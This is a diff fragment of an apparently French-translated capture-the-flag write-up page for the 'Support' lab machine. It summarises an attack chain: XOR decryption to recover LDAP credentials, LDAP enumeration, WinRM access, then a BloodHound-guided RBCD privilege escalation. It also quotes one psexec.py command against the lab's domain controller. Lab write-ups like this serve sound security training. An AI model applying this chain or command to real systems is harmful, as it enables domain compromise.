-            <div class="text-3xl font-bold text-green-500">2</div>
+        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
+            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
             <div class="flex-1">
                 <div class="font-bold text-green-600 dark:text-green-400">Reverse Engineering</div>
-                <div class="text-sm text-gray-600 dark:text-gray-400">ILSpy → XOR Decryption → LDAP Credentials</div>
+                <div class="text-sm text-gray-600 dark:text-gray-400">ILSpy → Déchiffrement XOR → Credentials LDAP</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
-            <div class="text-3xl font-bold text-purple-500">3</div>
+        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
+            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
             <div class="flex-1">
-                <div class="font-bold text-purple-600 dark:text-purple-400">LDAP Enumeration and WinRM</div>
-                <div class="text-sm text-gray-600 dark:text-gray-400">ldapsearch → info attribute → WinRM support</div>
+                <div class="font-bold text-purple-600 dark:text-purple-400">Énumération LDAP et WinRM</div>
+                <div class="text-sm text-gray-600 dark:text-gray-400">ldapsearch → Attribut info → WinRM support</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
-            <div class="text-3xl font-bold text-red-500">4</div>
+        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
+            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
             <div class="flex-1">
-                <div class="font-bold text-red-600 dark:text-red-400">Privilege Escalation</div>
+                <div class="font-bold text-red-600 dark:text-red-400">Escalade de privilèges</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">BloodHound → GenericAll → RBCD Attack → SYSTEM</div>
             </div>
         </div>
@@ -597,7 +646,7 @@ psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 
 ---
 
-## 🏷️ Tags & References
+## 🏷️ Tags & Références
 
 <div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
     <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Windows</span>
@@ -614,7 +663,7 @@ psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 
 <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
     <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
-        <i class="fas fa-link mr-2"></i>Useful References
+        <i class="fas fa-link mr-2"></i>Références utiles
     </h4>
     <ul class="space-y-2 text-gray-700 dark:text-gray-300">
         <li>
@@ -641,7 +690,7 @@ psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 ---
 
 <div class="text-center my-12">
-    <a href="{{ site.baseurl }}/en/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
-        <i class="fas fa-arrow-left mr-2"></i>Back to blog
+    <a href="{{ site.baseurl }}/fr/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
+        <i class="fas fa-arrow-left mr-2"></i>Retour au blog
     </a>
 </div>
